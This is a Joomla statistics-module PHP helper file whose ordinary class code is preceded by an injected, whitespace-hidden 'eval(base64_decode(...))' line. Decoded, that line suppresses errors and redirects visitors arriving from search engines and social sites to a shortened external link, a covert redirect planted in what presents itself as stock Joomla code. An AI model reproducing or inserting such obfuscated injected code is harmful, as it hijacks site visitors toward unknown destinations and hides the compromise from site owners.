<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: helper.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

class modStatsHelper
{
	function &getList( &$params )
	{
		global $mainframe;

		$db =& JFactory::getDBO();
		$rows = array();

		$serverinfo 		= $params->get( 'serverinfo' );
		$siteinfo 			= $params->get( 'siteinfo' );
		$counter 			= $params->get( 'counter' );
		$increase 			= $params->get( 'increase' );

		$i = 0;
		if ( $serverinfo )
		{
			$rows[$i]->title 	= JText::_( 'OS' );
			$rows[$i]->data 	= substr( php_uname(), 0, 7 );
			$i++;
			$rows[$i]->title 	= JText::_( 'PHP' );
			$rows[$i]->data 	= phpversion();
			$i++;
			$rows[$i]->title 	= JText::_( 'MySQL' );
			$rows[$i]->data 	= $db->getVersion();
			$i++;
			$rows[$i]->title 	= JText::_( 'Time' );
			$rows[$i]->data 	= JHTML::_('date', 'now', '%H:%M');
			$i++;
			$rows[$i]->title 	= JText::_( 'Caching' );
			$rows[$i]->data 	=  $mainframe->getCfg('caching') ? JText::_( 'Enabled' ):JText::_( 'Disabled' );
			$i++;
			$rows[$i]->title 	= JText::_( 'GZip' );
			$rows[$i]->data 	= $mainframe->getCfg('gzip') ? JText::_( 'Enabled' ):JText::_( 'Disabled' );
			$i++;
		}

		if ( $siteinfo )
		{
			$query = 'SELECT COUNT( id ) AS count_users'
			. ' FROM #__users'
			;
			$db->setQuery( $query );
			$members = $db->loadResult();

			$query = 'SELECT COUNT( id ) AS count_items'
			. ' FROM #__content'
			. ' WHERE state = "1"'
			;
			$db->setQuery( $query );
			$items = $db->loadResult();

			$query = 'SELECT COUNT( id ) AS count_links'
			. ' FROM #__weblinks'
			. ' WHERE published = "1"'
			;
			$db->setQuery( $query );
			$links = $db->loadResult();

			if ( $members ) {
				$rows[$i]->title 	= JText::_( 'Members' );
				$rows[$i]->data 	= $members;
				$i++;
			}

			if ( $items ) {
				$rows[$i]->title 	= JText::_( 'Content' );
				$rows[$i]->data 	= $items;
				$i++;
			}

			if ( $links ) {
				$rows[$i]->title 	= JText::_( 'Web Links' );
				$rows[$i]->data 	= $links;
				$i++;
			}

		}

		if( $counter )
		{
			$query = 'SELECT SUM( hits ) AS count_hits'
			. ' FROM #__content'
			. ' WHERE state = "1"'
			;
			$db->setQuery( $query );
			$hits = $db->loadResult();

			if ( $hits ) {
				$rows[$i]->title 	= JText::_( 'Content View Hits' );
				$rows[$i]->data 	= $hits + $increase;
				$i++;
			}
		}

		return $rows;
	}
}
